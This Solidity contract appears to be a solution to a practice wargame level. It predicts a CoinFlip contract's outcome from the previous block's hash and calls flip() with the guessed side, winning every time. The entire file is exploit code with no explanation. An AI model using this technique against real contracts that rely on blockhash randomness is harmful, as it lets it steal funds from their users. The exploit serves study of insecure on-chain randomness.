// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './CoinFlip.sol';

contract HackCoinFlip {
    CoinFlip public coinflip =
        CoinFlip(0xB63269c7617692E55e41b39530a92033e3d6F936);

    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    event Side(bool side);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        consecutiveWins = 0;
    }

    function hackFlip() public returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);

        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}
